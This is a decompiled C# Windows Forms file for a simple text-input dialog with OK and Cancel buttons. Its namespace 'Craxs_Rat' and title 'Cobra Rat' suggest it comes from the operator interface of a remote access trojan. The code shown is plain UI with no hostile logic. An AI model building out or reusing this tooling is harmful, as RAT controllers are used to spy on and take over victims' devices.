using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Dialog1 : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	public string Title;

	public string TheText;

	[field: AccessedThroughProperty("Mytext")]
	internal virtual TextBox Mytext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Mytitle")]
	internal virtual Label Mytitle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeUITitlePanel1")]
	internal virtual DrakeUITitlePanel DrakeUITitlePanel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Dialog1()
	{
		base.Load += Dialog1_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.Mytext = new System.Windows.Forms.TextBox();
		this.Mytitle = new System.Windows.Forms.Label();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUITitlePanel1 = new DrakeUI.Framework.DrakeUITitlePanel();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.Label1 = new System.Windows.Forms.Label();
		this.DrakeUITitlePanel1.SuspendLayout();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.Mytext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Mytext.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold);
		this.Mytext.Location = new System.Drawing.Point(0, 52);
		this.Mytext.Name = "Mytext";
		this.Mytext.Size = new System.Drawing.Size(504, 24);
		this.Mytext.TabIndex = 1;
		this.Mytitle.BackColor = System.Drawing.Color.Transparent;
		this.Mytitle.Dock = System.Windows.Forms.DockStyle.Top;
		this.Mytitle.Font = new System.Drawing.Font("Calibri", 20f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Mytitle.ForeColor = System.Drawing.Color.White;
		this.Mytitle.Location = new System.Drawing.Point(0, 0);
		this.Mytitle.Name = "Mytitle";
		this.Mytitle.Size = new System.Drawing.Size(504, 52);
		this.Mytitle.TabIndex = 3;
		this.Mytitle.Text = "Cobra Rat";
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(414, 0);
		this.DrakeUIButtonIcon1.Margin = new System.Windows.Forms.Padding(2);
		this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(30, 136, 229);
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(90, 35);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.StyleCustomMode = true;
		this.DrakeUIButtonIcon1.TabIndex = 4;
		this.DrakeUIButtonIcon1.Text = "OK";
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(305, 0);
		this.DrakeUIButtonIcon2.Margin = new System.Windows.Forms.Padding(2);
		this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.Red;
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(90, 35);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.StyleCustomMode = true;
		this.DrakeUIButtonIcon2.Symbol = 61453;
		this.DrakeUIButtonIcon2.TabIndex = 5;
		this.DrakeUIButtonIcon2.Text = "Cancel";
		this.DrakeUITitlePanel1.Controls.Add(this.Mytext);
		this.DrakeUITitlePanel1.Controls.Add(this.Panel1);
		this.DrakeUITitlePanel1.Controls.Add(this.Mytitle);
		this.DrakeUITitlePanel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUITitlePanel1.FillColor = System.Drawing.Color.Black;
		this.DrakeUITitlePanel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.DrakeUITitlePanel1.ForeColor = System.Drawing.Color.White;
		this.DrakeUITitlePanel1.Location = new System.Drawing.Point(0, 0);
		this.DrakeUITitlePanel1.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeUITitlePanel1.Name = "DrakeUITitlePanel1";
		this.DrakeUITitlePanel1.RectColor = System.Drawing.Color.Red;
		this.DrakeUITitlePanel1.Size = new System.Drawing.Size(504, 114);
		this.DrakeUITitlePanel1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUITitlePanel1.StyleCustomMode = true;
		this.DrakeUITitlePanel1.TabIndex = 6;
		this.DrakeUITitlePanel1.Text = null;
		this.DrakeUITitlePanel1.TitleColor = System.Drawing.Color.Red;
		this.DrakeUITitlePanel1.TitleHeight = 0;
		this.DrakeUITitlePanel1.TitleInterval = 0;
		this.Panel1.BackColor = System.Drawing.Color.Transparent;
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel1.Controls.Add(this.Label1);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel1.Location = new System.Drawing.Point(0, 79);
		this.Panel1.Margin = new System.Windows.Forms.Padding(2);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(504, 35);
		this.Panel1.TabIndex = 6;
		this.Label1.BackColor = System.Drawing.Color.Black;
		this.Label1.Dock = System.Windows.Forms.DockStyle.Right;
		this.Label1.Location = new System.Drawing.Point(395, 0);
		this.Label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(19, 35);
		this.Label1.TabIndex = 6;
		this.Label1.Text = "                 ";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 12f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(504, 114);
		base.ControlBox = false;
		base.Controls.Add(this.DrakeUITitlePanel1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "Dialog1";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		this.Text = "Select";
		base.TopMost = true;
		this.DrakeUITitlePanel1.ResumeLayout(false);
		this.DrakeUITitlePanel1.PerformLayout();
		this.Panel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void translateme()
	{
	}

	private void OK_Button_Click(object sender, EventArgs e)
	{
	}

	private void Cancel_Button_Click(object sender, EventArgs e)
	{
	}

	private void Dialog1_Load(object sender, EventArgs e)
	{
		Mytitle.Text = Title;
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		TheText = Mytext.Text;
		base.DialogResult = DialogResult.OK;
		Close();
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.No;
		Close();
	}
}
